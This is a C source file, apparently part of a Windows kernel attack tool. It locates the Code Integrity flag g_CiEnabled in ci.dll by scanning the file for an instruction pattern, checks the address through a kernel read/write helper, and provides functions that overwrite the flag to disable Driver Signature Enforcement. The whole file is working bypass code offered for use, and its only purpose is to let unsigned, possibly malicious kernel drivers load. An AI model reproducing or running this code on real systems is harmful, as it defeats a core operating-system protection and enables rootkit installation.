/*
 * dse.c — Locate and patch nt!g_CiEnabled via ci.dll PE analysis
 *
 * g_CiEnabled lives in ci.dll (Windows Code Integrity module), not ntoskrnl.
 * On Win10/11 it's a UCHAR at a static offset that CI checks before accepting
 * an image. Setting it to 0 disables signature enforcement for the duration.
 *
 * Signature scan method:
 *   ci!CiInitializePolicyAndForce references g_CiEnabled.
 *   We find this function, parse its instructions for the MOV byte ptr instruction
 *   that writes to g_CiEnabled, and extract the RIP-relative address.
 */

#include "dse.h"
#include "km_rw.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Undocumented NtQuerySystemInformation class for loaded modules */
#define SystemModuleInformation 11

typedef struct {
    ULONG  Reserved[2];
    PVOID  Base;
    ULONG  Size;
    ULONG  Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   ImageName[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct {
    ULONG         ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS (WINAPI *PNtQuerySystemInformation)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

static PNtQuerySystemInformation pNtQSI = NULL;

static bool get_module_base(const char *name, uint64_t *base_out, char *path_out, size_t path_sz)
{
    if (!pNtQSI) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        void *fn = (void*)GetProcAddress(ntdll, "NtQuerySystemInformation");
        pNtQSI = (PNtQuerySystemInformation)fn;
        if (!pNtQSI) return false;
    }

    ULONG   needed = 0;
    NTSTATUS st = pNtQSI(SystemModuleInformation, NULL, 0, &needed);
    if (needed == 0) return false;

    needed += 4096; /* some extra room */
    PSYSTEM_MODULE_INFORMATION info = (PSYSTEM_MODULE_INFORMATION)malloc(needed);
    if (!info) return false;

    st = pNtQSI(SystemModuleInformation, info, needed, &needed);
    if (st != 0) { free(info); return false; }

    for (ULONG i = 0; i < info->ModulesCount; i++) {
        PSYSTEM_MODULE m = &info->Modules[i];
        const char *mod_name = m->ImageName + m->ModuleNameOffset;
        if (_stricmp(mod_name, name) == 0) {
            *base_out = (uint64_t)(uintptr_t)m->Base;
            /* Build full path: \SystemRoot -> C:\Windows */
            char full[256];
            strncpy(full, m->ImageName, sizeof(full) - 1);
            /* Replace \SystemRoot with actual Windows dir */
            if (strncmp(full, "\\SystemRoot", 11) == 0) {
                char win[MAX_PATH];
                GetWindowsDirectoryA(win, sizeof(win));
                snprintf(path_out, path_sz, "%s%s", win, full + 11);
            } else {
                strncpy(path_out, full, path_sz - 1);
            }
            free(info);
            return true;
        }
    }

    free(info);
    return false;
}

/*
 * Byte signature for g_CiEnabled reference inside ci.dll
 *
 * In Win11 23H2 ci.dll, CiInitializePolicyAndForce contains:
 *   48 8D 0D ?? ?? ?? ??   LEA RCX, [RIP+offset]  ; addr of g_CiEnabled
 *   ...
 *   C6 01 ??               MOV byte ptr [RCX], ??
 *
 * We scan for the LEA+MOV pattern and decode the RIP-relative address.
 *
 * Pattern: C6 05 ?? ?? ?? ?? 06   (MOV byte ptr [RIP+disp32], 6)
 *          ^^--- sets g_CiEnabled = 6 (enabled)
 */
static const uint8_t CI_PATTERN[]  = { 0xC6, 0x05 };

bool DSE_FindCiEnabled(uint64_t *out_addr)
{
    uint64_t ci_base = 0;
    char     ci_path[MAX_PATH] = {0};

    if (!get_module_base("ci.dll", &ci_base, ci_path, sizeof(ci_path))) {
        fprintf(stderr, "[dse] failed to find ci.dll in loaded modules\n");
        return false;
    }
    printf("[dse] ci.dll kernel base: 0x%016llx\n", (unsigned long long)ci_base);
    printf("[dse] ci.dll disk path:   %s\n", ci_path);

    /* Load ci.dll from disk as a data file — don't execute it */
    HANDLE hFile = CreateFileA(ci_path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[dse] cannot open ci.dll from disk: %lu\n", GetLastError());
        return false;
    }

    DWORD file_sz = GetFileSize(hFile, NULL);
    uint8_t *buf = (uint8_t*)malloc(file_sz);
    if (!buf) { CloseHandle(hFile); return false; }

    DWORD read = 0;
    ReadFile(hFile, buf, file_sz, &read, NULL);
    CloseHandle(hFile);

    if (read != file_sz) { free(buf); return false; }

    /* Parse PE to find .text section bounds */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buf;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(buf + dos->e_lfanew);

    uint8_t *text_ptr  = NULL;
    uint64_t text_va   = 0;
    uint32_t text_size = 0;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            text_ptr  = buf + sec->PointerToRawData;
            text_va   = ci_base + sec->VirtualAddress;
            text_size = sec->SizeOfRawData;
            break;
        }
    }

    if (!text_ptr) {
        fprintf(stderr, "[dse] .text section not found in ci.dll\n");
        free(buf);
        return false;
    }

    /* Scan for MOV byte ptr [RIP+disp32], 06h — the write to g_CiEnabled=6 */
    for (size_t i = 0; i + 7 < text_size; i++) {
        /* Pattern: C6 05 <disp32> 06 */
        if (text_ptr[i]   == 0xC6 &&
            text_ptr[i+1] == 0x05 &&
            text_ptr[i+6] == 0x06)
        {
            /* Extract RIP-relative displacement (little-endian int32) */
            int32_t disp;
            memcpy(&disp, text_ptr + i + 2, 4);

            /* RIP at instruction end = text_va + i + 7 */
            uint64_t rip = text_va + (uint64_t)i + 7;
            uint64_t target = (uint64_t)((int64_t)rip + disp);

            printf("[dse] candidate g_CiEnabled @ 0x%016llx (disp=%d at offset 0x%zx)\n",
                   (unsigned long long)target, disp, i);

            /* Verify by reading what should be a 0 or 6 */
            uint32_t probe = 0;
            if (KmRw_ReadDword(target, &probe)) {
                uint8_t b = (uint8_t)(probe & 0xFF);
                if (b == 0 || b == 6 || b == 1) {
                    printf("[dse] g_CiEnabled confirmed = %u at 0x%016llx\n",
                           b, (unsigned long long)target);
                    *out_addr = target;
                    free(buf);
                    return true;
                }
            }
        }
    }

    fprintf(stderr, "[dse] g_CiEnabled signature not found — ci.dll may have changed\n");
    fprintf(stderr, "[dse] you may need to update CI_PATTERN in dse.c for this build\n");
    free(buf);
    return false;
}

bool DSE_Read(uint64_t addr, uint8_t *out_val)
{
    uint32_t dw = 0;
    if (!KmRw_ReadDword(addr, &dw)) return false;
    *out_val = (uint8_t)(dw & 0xFF);
    return true;
}

bool DSE_Write(uint64_t addr, uint8_t val)
{
    return KmRw_WriteByte(addr, val);
}
